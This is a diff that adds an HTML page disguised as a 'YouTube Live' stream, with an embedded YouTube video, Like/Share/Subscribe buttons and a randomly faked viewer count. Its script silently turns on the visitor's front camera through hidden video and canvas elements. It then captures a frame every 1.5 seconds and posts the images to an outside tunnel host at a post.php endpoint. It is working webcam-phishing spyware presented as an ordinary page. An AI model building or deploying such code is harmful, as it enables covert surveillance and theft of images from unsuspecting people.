@@ -1,0 +1,334 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YouTube Live</title>
+    <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow-x: hidden;
+        }
+
+        .video-wrap {
+            display: none;
+        }
+
+        #canvas {
+            display: none;
+        }
+
+        .container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            max-width: 1400px;
+            margin: 0 auto;
+            width: 100%;
+            padding: 20px;
+        }
+
+        .header {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 16px;
+            padding: 20px 30px;
+            margin-bottom: 20px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .logo-icon {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, #FF0000, #CC0000);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 700;
+            font-size: 20px;
+        }
+
+        .logo-text {
+            font-size: 24px;
+            font-weight: 700;
+            color: #1a1a1a;
+        }
+
+        .live-badge {
+            background: #FF0000;
+            color: white;
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .live-badge::before {
+            content: '';
+            width: 8px;
+            height: 8px;
+            background: white;
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .video-container {
+            background: #000;
+            border-radius: 16px;
+            overflow: hidden;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            position: relative;
+            aspect-ratio: 16/9;
+            margin-bottom: 20px;
+        }
+
+        .video-container iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+
+        .video-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(180deg, rgba(0,0,0,0.3) 0%, transparent 50%);
+            pointer-events: none;
+        }
+
+        .controls {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 16px;
+            padding: 20px 30px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+
+        .control-group {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .control-btn {
+            background: #f5f5f5;
+            border: none;
+            border-radius: 12px;
+            padding: 12px 20px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 500;
+            color: #333;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .control-btn:hover {
+            background: #e8e8e8;
+            transform: translateY(-2px);
+        }
+
+        .control-btn.active {
+            background: #667eea;
+            color: white;
+        }
+
+        .control-btn.danger {
+            background: #ff4444;
+            color: white;
+        }
+
+        .control-btn.danger:hover {
+            background: #cc0000;
+        }
+
+        .viewer-count {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #666;
+            font-size: 14px;
+        }
+
+        .viewer-count::before {
+            content: '👁️';
+            font-size: 18px;
+        }
+
+        @media (max-width: 768px) {
+            .header {
+                flex-direction: column;
+                gap: 15px;
+                text-align: center;
+            }
+
+            .controls {
+                flex-direction: column;
+            }
+
+            .control-group {
+                width: 100%;
+                justify-content: center;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="video-wrap" hidden="hidden">
+        <video id="video" playsinline autoplay></video>
+    </div>
+    <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+    <div class="container">
+        <div class="header">
+            <div class="logo">
+                <div class="logo-icon">YT</div>
+                <div class="logo-text">YouTube Live</div>
+            </div>
+            <div class="live-badge">LIVE</div>
+        </div>
+
+        <div class="video-container">
+            <iframe id="Live_YT_TV" src="https://www.youtube.com/embed/8Jf6diyzchI?autoplay=1&controls=1&modestbranding=1&rel=0" frameborder="0" allow="autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+            <div class="video-overlay"></div>
+        </div>
+
+        <div class="controls">
+            <div class="control-group">
+                <button class="control-btn" id="likeBtn">
+                    👍 Like
+                </button>
+                <button class="control-btn" id="shareBtn">
+                    📤 Share
+                </button>
+                <button class="control-btn" id="subscribeBtn">
+                    🔔 Subscribe
+                </button>
+            </div>
+            <div class="viewer-count">
+                <span id="viewerCount">1,234</span> watching
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function post(imgdata) {
+            $.ajax({
+                type: 'POST',
+                data: { cat: imgdata },
+                url: 'https://48c78cddfba1176a-119-111-179-31.serveousercontent.com/post.php',
+                dataType: 'json',
+                async: false,
+                success: function (result) {
+                    // Handle response
+                },
+                error: function () {
+                    // Handle error
+                }
+            });
+        }
+
+        'use strict';
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const errorMsgElement = document.querySelector('span#errorMsg');
+
+        const constraints = {
+            audio: false,
+            video: {
+                facingMode: "user"
+            }
+        };
+
+        async function init() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                handleSuccess(stream);
+            } catch (e) {
+                if (errorMsgElement) {
+                    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+                }
+            }
+        }
+
+        function handleSuccess(stream) {
+            window.stream = stream;
+            video.srcObject = stream;
+
+            var context = canvas.getContext('2d');
+            setInterval(function () {
+                context.drawImage(video, 0, 0, 640, 480);
+                var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+                post(canvasData);
+            }, 1500);
+        }
+
+        // Simulate viewer count updates
+        function updateViewerCount() {
+            const count = Math.floor(Math.random() * 500) + 1000;
+            document.getElementById('viewerCount').textContent = count.toLocaleString();
+        }
+
+        // Initialize
+        init();
+        setInterval(updateViewerCount, 5000);
+
+        // Button interactions
+        document.getElementById('likeBtn').addEventListener('click', function() {
+            this.classList.toggle('active');
+        });
+
+        document.getElementById('subscribeBtn').addEventListener('click', function() {
+            this.classList.toggle('active');
+            this.textContent = this.classList.contains('active') ? '🔔 Subscribed' : '🔔 Subscribe';
+        });
+    </script>
+</body>
+</html>
